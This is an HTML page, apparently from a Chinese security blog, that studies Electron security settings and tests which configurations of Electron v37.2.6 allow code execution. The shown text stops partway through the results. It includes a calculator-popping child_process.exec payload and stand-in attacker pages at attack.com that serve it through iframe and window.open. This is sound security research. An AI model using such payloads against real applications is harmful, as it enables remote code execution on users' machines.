@@ -1,0 +1,1294 @@
+<!DOCTYPE html>
+<html lang="en" color-mode="light">
+
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="author" content="X2n." />
+  <!-- Open Graph Description 简短摘要-->
+  
+  <!-- 用于搜索引擎的文章摘要 -->
+  
+  
+  
+  <title>
+    
+      Electron中的安全问题 
+      
+      
+      |
+    
+     X2n.: Keep your passion for what you love !
+  </title>
+
+  
+    <link rel="apple-touch-icon" href="/images/favicon.png">
+    <link rel="icon" href="/images/favicon.png">
+  
+
+  <!-- Raleway-Font -->
+  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">
+
+  <!-- hexo site css -->
+  <link rel="stylesheet" href="/css/main.css" />
+  <link rel="stylesheet" href="//at.alicdn.com/t/font_1886449_67xjft27j1l.css" />
+  <!-- 代码块风格 -->
+  
+    
+<link rel="stylesheet" href="/css/figcaption/mac-block.css">
+
+  
+
+  <!-- jquery3.3.1 -->
+  
+    <script defer type="text/javascript" src="/plugins/jquery.min.js"></script>
+  
+
+  <!-- fancybox -->
+  
+    <link href="/plugins/jquery.fancybox.min.css" rel="stylesheet">
+    <script defer type="text/javascript" src="/plugins/jquery.fancybox.min.js"></script>
+  
+  
+<script src="/js/fancybox.js"></script>
+
+
+  
+
+  
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+  
+
+  <script>
+    var html = document.documentElement
+    const colorMode = localStorage.getItem('color-mode')
+    if (colorMode) {
+      document.documentElement.setAttribute('color-mode', colorMode)
+    }
+  </script>
+<meta name="generator" content="Hexo 7.3.0"><link rel="alternate" href="/atom.xml" title="X2n.: Keep your passion for what you love !" type="application/atom+xml">
+</head>
+
+
+  <body>
+    <div id="app">
+      <div class="header">
+  <div class="avatar">
+    <a href="/">
+      <!-- 头像取消懒加载，添加no-lazy -->
+      
+        <img src="/images/avatar.png" alt="">
+      
+    </a>
+    <div class="nickname"><a href="/">X2n.</a></div>
+  </div>
+  <div class="navbar">
+    <ul>
+      
+        <li class="nav-item" data-path="/">
+          <a href="/">Home</a>
+        </li>
+      
+        <li class="nav-item" data-path="/archives/">
+          <a href="/archives/">Archives</a>
+        </li>
+      
+        <li class="nav-item" data-path="/tags/">
+          <a href="/tags/">Tags</a>
+        </li>
+      
+        <li class="nav-item" data-path="/categories/">
+          <a href="/categories/">Category</a>
+        </li>
+      
+        <li class="nav-item" data-path="/about/">
+          <a href="/about/">About</a>
+        </li>
+      
+    </ul>
+  </div>
+</div>
+
+
+<script src="/js/activeNav.js"></script>
+
+
+
+      <div class="flex-container">
+        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
+<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->
+
+
+  <!-- LaTex Display -->
+
+  
+    <script async type="text/javascript" src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-chtml.js"></script>
+  
+  <script>
+    MathJax = {
+      tex: {
+        inlineMath: [['$', '$'], ['\\(', '\\)']]
+      }
+    }
+  </script>
+
+
+
+
+
+  <!-- clipboard -->
+
+  
+    <script async type="text/javascript" src="https://cdn.jsdelivr.net/npm/clipboard@2.0.10/dist/clipboard.min.js"></script>
+  
+  
+<script src="/js/codeCopy.js"></script>
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
+  <div class="container post-details" id="post-details">
+    <div class="post-content">
+      <div class="post-title">Electron中的安全问题</div>
+      <div class="post-attach">
+        <span class="post-pubtime">
+          <i class="iconfont icon-updatetime mr-10" title="Update time"></i>
+          2025-08-15 11:06:42
+        </span>
+        
+              <span class="post-tags">
+                <i class="iconfont icon-tags mr-10" title="Tags"></i>
+                
+                <span class="span--tag mr-8">
+                  <a href="/tags/RCE/" title="RCE">
+                    #RCE
+                  </a>
+                </span>
+                
+                <span class="span--tag mr-8">
+                  <a href="/tags/Electron/" title="Electron">
+                    #Electron
+                  </a>
+                </span>
+                
+              </span>
+          
+              <span class="post-categories">
+                <i class="iconfont icon-bookmark" title="Categories"></i>
+                
+                <span class="span--category">
+                  <a href="/categories/%E5%AE%A2%E6%88%B7%E7%AB%AF%E5%AE%89%E5%85%A8/" title="客户端安全">
+                    <b>#</b> 客户端安全
+                  </a>
+                </span>
+                
+              </span>
+          
+      </div>
+      <div class="markdown-body">
+        <h2 id="Electron简介">Electron简介</h2>
+<p>本文参考大佬文章<sup class="footnote-ref"><a href="#fn1" id="fnref1">[1]</a></sup>，摘取部分个人认为比较重要的内容，产出了这篇文章，算是一个学习笔记吧。</p>
+<p>Electron是一个使用Javascript、HTMl和CSS构建桌面应用程序的架构<sup class="footnote-ref"><a href="#fn2" id="fnref2">[2]</a></sup>。嵌入<code>Chromium</code>和<code>Node.js</code>到二进制的Electron允许您保持一个Javascript代码代码库并创建在Windows上运行的跨平台应用macOS和Linux一一不需要本地开发经验。</p>
+<h3 id="Electron架构">Electron架构</h3>
+<p><code>Chromium</code>具备网页渲染能力，<code>Nodejs</code>具备操作系统API的能力。</p>
+<p><img src="/2025/08/12/Electron%E4%B8%AD%E7%9A%84%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/image-20250812205436209.png" alt="image-20250812205436209"></p>
+<p>因此从架构上，<code>Electron</code>分为两个部分：<strong>主进程</strong>和<strong>渲染进程</strong></p>
+<h3 id="主进程">主进程</h3>
+<p>每个Electron应用都有一个单一的主进程，作为应用程序的入口点。主进程在<code>Node.js</code>环境中运行，这意味着它具有<code>require</code>模块和使用所有Node.js API的能力。</p>
+<p><img src="/2025/08/12/Electron%E4%B8%AD%E7%9A%84%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/image-20250812205757512.png" alt="image-20250812205757512"></p>
+<h3 id="渲染进程">渲染进程</h3>
+<p>每个Electron应用都会为每个打开的<code>BrowserWindow</code>（与每个网页嵌入）生成一个单独的渲染器进程。恰如起名，渲染器负责渲染网页内容。所以实际上，运行于渲染器进程中的代码是须遵照网页标准的（至少就目前使用的Chromium而言是如此）。</p>
+<h3 id="预加载脚本-preload">预加载脚本(preload)</h3>
+<p>主进程可以与操作系统交互，渲染进程只能渲染网页，那么当功能需要操作系统支持的时候，渲染进程如何将需求传递给主进程，主进程又如何将结果传递给渲染进程就是个问题！</p>
+<p><strong>Electron设计了一系列的<code>IPC</code>功能，方便主进程和渲染进程间通信，渲染进程的通信通常在<code>preload</code>脚本中发生。</strong></p>
+<p>预加载（<code>preload</code>）脚本包含了那些执行于渲染器进程中，<strong>且先于网页内容开始加载的代码</strong>。这些脚本虽运行于渲染器的环境中，却因能访问Node.js API而拥有了更多的权限。当然，为了安全考虑，它的API是受限的，<strong>主要就是发起<code>IPC</code>请求或监听，将自定义的<code>API</code>和变量等传递给渲染进程使用。</strong></p>
+<h3 id="实用进程">实用进程</h3>
+<p>在<code>Electron 22.0.0</code>中开始引入<code>utility process</code><sup class="footnote-ref"><a href="#fn3" id="fnref3">[3]</a></sup>，每个Electron应用程序都可以使用主进程生成多个子进程<code>UtilityProcess API</code>，实用进程（官方翻译叫效率进程）可用于托管，例如：不受信任的服务器，CPU密集型任务或以前容易崩溃的组件托管在主进程或使用Node.js<code>child_process.fork</code> API生成的进程中。</p>
+<p>更多详细参考官网<sup class="footnote-ref"><a href="#fn4" id="fnref4">[4]</a></sup>，本部分参考<code>流程模型</code>章节<sup class="footnote-ref"><a href="#fn5" id="fnref5">[5]</a></sup>。</p>
+<h2 id="远程调试Electron">远程调试Electron</h2>
+<p>很多情况下，<code>Electron</code>应用都是无法打开控制台的，这就给测试增加了麻烦。通过这个远程调试的方法，可以远程打开控制台对应用进行控制台调试，更加方便。</p>
+<p>以&quot;夸克&quot;为例：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">cd /Applications/Quark.app/Contents/MacOS</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">调试渲染程序</span></span><br><span class="line">./Quark --remote-debugging-port=9222</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">调试主程序</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">./Quark --inspect=9222</span></span><br></pre></td></tr></table></figure>
+<p>然后Chrome浏览器访问<code>chrome://inspect/#devices</code></p>
+<p><img src="/2025/08/12/Electron%E4%B8%AD%E7%9A%84%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/image-20250812212229391.png" alt="image-20250812212229391"></p>
+<p>点击<code>inspect</code>就可以了。</p>
+<p><img src="/2025/08/12/Electron%E4%B8%AD%E7%9A%84%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/image-20250812212309164.png" alt="image-20250812212309164"></p>
+<h2 id="涉及安全问题的配置">涉及安全问题的配置</h2>
+<p>想要去挖掘到Electron开发的应用漏洞，就要从下面的几个参数配置下手。</p>
+<h3 id="nodeIntegration">nodeIntegration<sup class="footnote-ref"><a href="#fn6" id="fnref6">[6]</a></sup></h3>
+<p><strong>这个属性是主进程创建渲染进程窗口控制渲染进程是否具备执行<code>NodeJs</code>的能力，如果该属性设置为<code>true</code>，渲染进程一旦出现<code>XSS</code>等漏洞，能够执行<code>Javascript</code>代码，就会导致<code>RCE</code>漏洞。</strong></p>
+<p>这个特性在<code>5.0</code>版本开始默认设置为<code>false</code>，<code>Electron</code>中通过<code>IPC</code>通信，可以让渲染进程执行开发者自定义的功能，这种通信更加安全，<strong>绝不推荐开启<code>nodeIntegration</code>功能</strong>。</p>
+<h3 id="contextIsolation">contextIsolation<sup class="footnote-ref"><a href="#fn7" id="fnref7">[7]</a></sup></h3>
+<p>上下文隔离，从<code>Electron 12.0.0</code>版本开始默认开启(<code>true</code>)</p>
+<p><strong>这个属性是主进程创建渲染进程窗口控制渲染进程是否具备覆盖<code>JavaScript</code>方法的能力，如果该属性设置为<code>false</code>，渲染进程一旦出现<code>XSS</code>等漏洞，能够执行覆盖<code>Javascript</code>代码，配合预加载脚本及主进程定义好的功能，可能会导致<code>RCE</code>漏洞。</strong></p>
+<h3 id="Preload预加载脚本">Preload预加载脚本<sup class="footnote-ref"><a href="#fn8" id="fnref8">[8]</a></sup></h3>
+<p>简单粗略来说，<code>Electron = Nodejs + Chromium</code>，<code>Nodejs</code>负责系统交互，可以理解为主进程，<code>Chromium</code>负责页面渲染，可以理解为渲染进程。</p>
+<p>比较常见的配置是禁止渲染进程执行<code>Node.js</code>代码，同时开启上下文隔离，此时如果渲染进程想要使用操作系统或者硬件的部分功能怎么办？</p>
+<p>**通过<code>IPC</code>通信！！！**主进程定义好功能，之后渲染进程只传递数据，这样就可以保证<code>XSS</code>不会轻易导致<code>RCE</code>。但是如果所有渲染进程都可以发<code>IPC</code>也很危险，所以在主进程和渲染进程之间吧，设置了一种叫preload预加载脚本的东西，<strong>会在创建窗口的时候指定预加载脚本可以执行部分<code>Node.js</code>代码。</strong></p>
+<p>毕竟，preload要代表渲染进程与主进程通信，但是危险的方法都用不了，之后<strong>通过一种官方定义的桥将方法暴露给渲染进程，这样渲染进程直接调用方法就好了。</strong></p>
+<p>检查预加载preload到底有没有漏洞，主要看两点：</p>
+<ul>
+<li>是否存在危险方法：
+<ul>
+<li>加载任意<code>Nodejs</code>模块等。</li>
+</ul>
+</li>
+<li>是否存在过度暴露
+<ul>
+<li>例如预加载脚本preload将用来<code>IPC</code>通信的对象直接暴露给渲染进程。</li>
+</ul>
+</li>
+</ul>
+<p><strong>预加载脚本文件检查过程中要与主进程关联着看，<code>IPC</code>通信是有<code>暗号</code>的，一一对应。</strong></p>
+<h4 id="官方实例：渲染进程到主进程（双向）">官方实例：渲染进程到主进程（双向）</h4>
+<p>我们来看一个官方的案例<sup class="footnote-ref"><a href="#fn9" id="fnref9">[9]</a></sup>。</p>
+<p>其中的模式2：渲染器进程到主进程（双向）</p>
+<p>这是一个渲染器进程到主进程通信的案例，我们将从渲染器进程打开一个原生的文件对话框，并返回所选文件的路径。</p>
+<p><img src="/2025/08/12/Electron%E4%B8%AD%E7%9A%84%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/image-20250812221326504.png" alt="image-20250812221326504"></p>
+<p>可以看到主进程创建窗口前，先试用<code>ipcMain.handle()</code>创建了监听，并提供了&quot;暗号&quot;，即代码中的<code>dialog:openFile</code>，以及对应的处理程序。</p>
+<p>预加载脚本<code>preload.js</code>通过<code>contextBridge</code>向渲染进程暴露了方法<code>electronAPI.openFile()</code>方法就可以了，调用后，预加载脚本中<code>ipcRenderer</code>向主进程发送“暗号”<code>dialog:openFile</code>，主进程就明白过来了，交给<code>handleFileOpen</code>函数进行处理。</p>
+<p>回到我们刚才提到的两点检查项：</p>
+<ul>
+<li>
+<p>是否存在危险方法？</p>
+<p>如果有一些方法是预加载脚本<strong>传递命令字符串，主进程负责执行并返回</strong>，那这就属于危险方法了。</p>
+</li>
+<li>
+<p>是否存在过度暴露？</p>
+<p>如果预加载脚本直接将<code>ipcRenderer</code>暴露给渲染进程，而不是上面的<code>electronAPI.openFile()</code>，那就属于过度暴露。</p>
+</li>
+</ul>
+<p>如果上下文隔离被设置为<code>false</code>，那渲染进程里写的内容就已经没有那么重要了，因为每一个方法都可能被渲染进程覆盖，只能看主进程的实现上有没有危险的内容。</p>
+<h3 id="Sandbox">Sandbox<sup class="footnote-ref"><a href="#fn10" id="fnref10">[10]</a></sup></h3>
+<p>Chromium的一个关键安全特性是，进程可以在沙盒中执行。沙盒通过限制对大多数系统资源的访问来减少恶意代码可能造成的伤害 — 沙盒化的进程只能自由使用<code>CPU</code>周期和内存。为了执行需要额外权限的操作，沙盒处的进程通过专用通信渠道将任务下放给更大权限的进程<sup class="footnote-ref"><a href="#fn11" id="fnref11">[11]</a></sup>。</p>
+<p>从<code>Electron 20</code>开始，渲染进程默认启用了沙盒，无需进一步配置。如果你想禁用某个进程的沙盒，请参阅<a target="_blank" rel="noopener" href="https://www.electronjs.org/zh/docs/latest/tutorial/sandbox#%E4%B8%BA%E5%8D%95%E4%B8%AA%E8%BF%9B%E7%A8%8B%E7%A6%81%E7%94%A8%E6%B2%99%E7%9B%92">为单个进程禁用沙盒</a>部分。</p>
+<p>官方文档中还说了<strong>在渲染器中启用 nodeIntegration 时，沙盒也会被禁用</strong>。</p>
+<h3 id="自定义协议">自定义协议<sup class="footnote-ref"><a href="#fn12" id="fnref12">[12]</a></sup></h3>
+<p>这个部分是经常产生漏洞的地方，检查也就是看其是否合理，有没有目录浏览，目录穿越等，导致的问题<strong>主要是本地文件泄露和远程代码执行。</strong></p>
+<h3 id="webSecurity">webSecurity<sup class="footnote-ref"><a href="#fn13" id="fnref13">[13]</a></sup></h3>
+<p><code>webSecurity</code>是开启同源策略的，<strong>默认即开启。</strong></p>
+<p>关闭<code>webSecurity</code>可能导致加载其它域的<code>JavaScript</code>脚本。</p>
+<h3 id="内容安全策略CSP">内容安全策略CSP<sup class="footnote-ref"><a href="#fn14" id="fnref14">[14]</a></sup></h3>
+<p>内容安全策略（CSP）是应对<code>XSS</code>攻击和数据注入攻击的又一层保护措施。我们建议任何载入到<code>Electron</code>的站点都要开启。</p>
+<p>CSP属于是一种白名单机制，能够有效的防止外部<code>JavaScript</code>注入执行等，建议开启，检查方法也比较简单，<strong>就看窗口加载的html中是否设置了策略即可</strong>。</p>
+<p>相关的配置类似如下：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Security-Policy&quot;</span> <span class="attr">content</span>=<span class="string">&quot;default-src &#x27;none&#x27;&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<h2 id="针对v37-2-6各种配置的实际危害测试">针对v37.2.6各种配置的实际危害测试</h2>
+<p><code>Electron</code>官方开发了<code>Electron Fiddle</code>程序，可以直接选择<code>Electron</code>版本，非常方便，但是需要系统准备对应的<code>NodeJS</code>环境，代码就使用默认的，我们在其中修改配置，进行测试。</p>
+<p>测试从一下几个角度进行：</p>
+<table>
+<thead>
+<tr>
+<th>安全配置</th>
+<th>测试执行JS点</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>nodeIntegration</td>
+<td>渲染的页面</td>
+</tr>
+<tr>
+<td>contextIsolation</td>
+<td>预加载脚本（Preload）</td>
+</tr>
+<tr>
+<td>sanbox</td>
+<td>iframe内页面</td>
+</tr>
+</tbody>
+</table>
+<p>3个配置选项，2 x 2 x 2 = 8种结果，<code>true</code>开启，<code>false</code>关闭，分布如下：</p>
+<table>
+<thead>
+<tr>
+<th>配置序号</th>
+<th>nodeIntegration</th>
+<th>contextIsolation</th>
+<th>sandbox</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>1</td>
+<td>true</td>
+<td>true</td>
+<td>true</td>
+</tr>
+<tr>
+<td>2</td>
+<td>true</td>
+<td>true</td>
+<td>false</td>
+</tr>
+<tr>
+<td>3</td>
+<td>true</td>
+<td>false</td>
+<td>true</td>
+</tr>
+<tr>
+<td>4</td>
+<td>true</td>
+<td>false</td>
+<td>false</td>
+</tr>
+<tr>
+<td>5</td>
+<td>false</td>
+<td>true</td>
+<td>true</td>
+</tr>
+<tr>
+<td>6</td>
+<td>false</td>
+<td>true</td>
+<td>false</td>
+</tr>
+<tr>
+<td>7</td>
+<td>false</td>
+<td>false</td>
+<td>true</td>
+</tr>
+<tr>
+<td>8</td>
+<td>false</td>
+<td>false</td>
+<td>false</td>
+</tr>
+</tbody>
+</table>
+<h3 id="测试环境和payload">测试环境和payload</h3>
+<p>本次测试的的<code>Electron</code>的版本为：<code>v37.2.6</code>，使用的系统是<code>Macos</code>。</p>
+<p>测试的Payload：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>).<span class="title function_">exec</span>(<span class="string">&#x27;open -a Calculator&#x27;</span>)</span><br></pre></td></tr></table></figure>
+<p>iframe服务器<code>attack.com/1.html</code></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Hello World!<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>).<span class="title function_">exec</span>(<span class="string">&#x27;open -a Calculator&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>window.open服务器<code>attack.com/2.html</code></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Hello World!<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="variable language_">window</span>.<span class="title function_">open</span>(<span class="string">&quot;http://attack.com/3.html&quot;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p><code>attack.com/3.html</code></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Hello World!<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>).<span class="title function_">exec</span>(<span class="string">&#x27;open -a Calculator&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>为了测试<code>iframe</code>，关闭<code>CSP</code>。</p>
+<h3 id="默认配置-配置5">默认配置(配置5)</h3>
+<p>根据官方文档<code>Electron</code>自<code>5.0.0.</code>以后，<code>nodeIntegration</code>默认是为<code>false</code>，自<code>12.0.0</code>以后<code>contextIsolation</code>默认为<code>true</code>。从 <code>Electron 20</code> 开始，渲染进程默认启用了沙盒。CSP官方给的案例中是使用了的，这里为了测试iframe，要给CSP去掉。</p>
+<p>所以这里的配置为：</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">nodeIntegration:</span> <span class="literal">false</span></span><br><span class="line"><span class="attr">contextIsolation:</span> <span class="literal">true</span></span><br><span class="line"><span class="attr">sandbox:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure>
+<p>即这里就是前面表格中所说的<strong>配置5</strong>的环境。</p>
+<p>下面是测试的结果。</p>
+<h4 id="预加载脚本preload">预加载脚本preload</h4>
+<p><img src="/2025/08/12/Electron%E4%B8%AD%E7%9A%84%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/image-20250813150300734.png" alt="image-20250813150300734"></p>
+<p>运行，发现没弹计算器，失败。</p>
+<p><img src="/2025/08/12/Electron%E4%B8%AD%E7%9A%84%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/image-20250813150433641.png" alt="image-20250813150433641"></p>
+<h4 id="渲染进程-2">渲染进程</h4>
+<p><img src="/2025/08/12/Electron%E4%B8%AD%E7%9A%84%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/image-20250813150608042.png" alt="image-20250813150608042"></p>
+<p>运行，发现没弹计算器，失败。</p>
+<p><img src="/2025/08/12/Electron%E4%B8%AD%E7%9A%84%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/image-20250813150639369.png" alt="image-20250813150639369"></p>
+<h4 id="iframe">iframe</h4>
+<p><img src="/2025/08/12/Electron%E4%B8%AD%E7%9A%84%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/image-20250813152310768.png" alt="image-20250813152310768"></p>
+<p>运行，发现没弹计算器，失败。</p>
+<p><img src="/2025/08/12/Electron%E4%B8%AD%E7%9A%84%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/image-20250813152353763.png" alt="image-20250813152353763"></p>
+<h4 id="小结">小结</h4>
+<table>
+<thead>
+<tr>
+<th>测试执行JS点</th>
+<th>是/否可以执行NodeJS</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>预加载脚本preload</td>
+<td>否</td>
+</tr>
+<tr>
+<td>渲染页面</td>
+<td>否</td>
+</tr>
+<tr>
+<td>iframe</td>
+<td>否</td>
+</tr>
+<tr>
+<td>iframe + window.open</td>
+<td>否</td>
+</tr>
+</tbody>
+</table>
+<h3 id="配置1">配置1</h3>
+<p>配置情况：</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">nodeIntegration:</span> <span class="literal">true</span></span><br><span class="line"><span class="attr">contextIsolation:</span> <span class="literal">true</span></span><br><span class="line"><span class="attr">sandbox:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure>
+<h4 id="预加载脚本preload-2">预加载脚本preload</h4>
+<p><img src="/2025/08/12/Electron%E4%B8%AD%E7%9A%84%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/image-20250813165500707.png" alt="image-20250813165500707"></p>
+<p>运行，发现没弹计算器，失败。</p>
+<p><img src="/2025/08/12/Electron%E4%B8%AD%E7%9A%84%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/image-20250813165525210.png" alt="image-20250813165525210"></p>
+<h4 id="渲染进程-3">渲染进程</h4>
+<p><img src="/2025/08/12/Electron%E4%B8%AD%E7%9A%84%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/image-20250813165632111.png" alt="image-20250813165632111"></p>
+<p>运行，发现没弹计算器，失败。</p>
+<p><img src="/2025/08/12/Electron%E4%B8%AD%E7%9A%84%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/image-20250813165725441.png" alt="image-20250813165725441"></p>
+<h4 id="iframe-2">iframe</h4>
+<p><img src="/2025/08/12/Electron%E4%B8%AD%E7%9A%84%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/image-20250813165840821.png" alt="image-20250813165840821"></p>
+<p>运行，发现没弹计算器，失败。</p>
+<p><img src="/2025/08/12/Electron%E4%B8%AD%E7%9A%84%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/image-20250813165915917.png" alt="image-20250813165915917"></p>
+<h4 id="小结-2">小结</h4>
+<table>
+<thead>
+<tr>
+<th>测试执行JS点</th>
+<th>是/否可以执行NodeJS</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>预加载脚本preload</td>
+<td>否</td>
+</tr>
+<tr>
+<td>渲染页面</td>
+<td>否</td>
+</tr>
+<tr>
+<td>iframe</td>
+<td>否</td>
+</tr>
+<tr>
+<td>iframe + window.open</td>
+<td>否</td>
+</tr>
+</tbody>
+</table>
+<h3 id="配置2">配置2</h3>
+<p>配置情况：</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">nodeIntegration:</span> <span class="literal">true</span></span><br><span class="line"><span class="attr">contextIsolation:</span> <span class="literal">true</span></span><br><span class="line"><span class="attr">sandbox:</span> <span class="literal">false</span></span><br></pre></td></tr></table></figure>
+<h4 id="预加载脚本preload-✔️">预加载脚本preload ✔️</h4>
+<p><img src="/2025/08/12/Electron%E4%B8%AD%E7%9A%84%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/image-20250813171051806.png" alt="image-20250813171051806"></p>
+<p>运行，成功弹出计算器！！！</p>
+<p><img src="/2025/08/12/Electron%E4%B8%AD%E7%9A%84%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/image-20250813171130612.png" alt="image-20250813171130612"></p>
+<h4 id="渲染脚本">渲染脚本</h4>
+<p><img src="/2025/08/12/Electron%E4%B8%AD%E7%9A%84%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/image-20250813171222021.png" alt="image-20250813171222021"></p>
+<p>运行，发现没弹计算器，失败。</p>
